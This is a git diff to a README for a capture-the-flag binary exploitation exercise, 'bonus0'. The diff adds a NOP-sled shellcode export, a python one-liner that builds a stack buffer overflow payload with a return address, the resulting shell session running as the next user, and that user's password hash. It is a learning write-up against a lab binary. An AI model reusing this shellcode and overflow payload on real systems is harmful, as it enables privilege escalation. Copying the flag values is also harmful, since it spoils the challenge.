@@ -11,7 +11,7 @@ Usage: ./main.sh
 |        |                                                                    |
 | ------ | ------------------------------------------------------------------ |
 | bonus0 | `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728` |
-| bonus1 | ``                                                                 |
+| bonus1 | `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9` |
 
 ## Steps to resolve on VM
 
@@ -107,7 +107,7 @@ Stopped reason: SIGSEGV
 ```
 
 ```
-export SHELLCODE=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+export SHELLCODE=$(python -c 'print "\x90" * 0xff + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
 ```
 
 ```shell
@@ -118,9 +118,22 @@ $1 = 0xbffff86e
 
 
 ABCDEFGHIJKLMNOPQRSTUVWXYZ
-abcdefghi\x6e\xf8\xff\xbfnoprstuvwxyz
+abcdefghi\x6e\xf8\xff\xbf
 
 python -c 'print "A" * 4095 + "\n" + "abcdefghi" + "\x6e\xf8\xff\xbf" + "nopqrstuvwxyz"' > /tmp/exploit10
+
+python -c 'print "A" * 4095 + "\n" + "abcdefghi" + "\x76\xf8\xff\xbf" + "nopqrstuvwxyz"' > /tmp/exploit10
+```
+
+```shell
+cat /tmp/exploit10 - | ~/bonus0
+   -
+   -
+  > AAAAAAAAAAAAAAAAAAAAabcdefghiwnopqrst abcdefghiwnopqrst
+  $ whoami
+  > bonus1
+  $ cat /home/user/bonus1/.pass
+  > cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 ```
 
 ---
@@ -130,6 +143,7 @@ python -c 'print "A" * 4095 + "\n" + "abcdefghi" + "\x6e\xf8\xff\xbf" + "nopqrst
 ### Hack
 
 - [Buffer overflow et variable d'environnement](https://www.hacktion.be/buffer-overflow-variable-environnement/)
+- [Buffer overflow works in gdb but not without it](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it)
 
 ### C
 
